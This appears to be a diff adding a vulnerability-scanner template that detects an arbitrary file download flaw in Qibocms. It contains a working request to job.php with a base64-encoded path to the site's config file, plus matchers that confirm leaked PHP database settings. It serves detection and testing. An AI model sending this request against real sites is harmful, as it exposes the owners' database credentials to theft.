@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <?php
+            - $webdb
+        - part: header
+          type: word
+          words:
+            - filename=config
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8'
+id: qibocms-file-download
+info:
+    author: theabhinavgaur
+    metadata:
+        max-request: 1
+        verified: true
+    name: Qibocms - Arbitrary File Download
+    severity: high
+    tags:
+        - qibocms
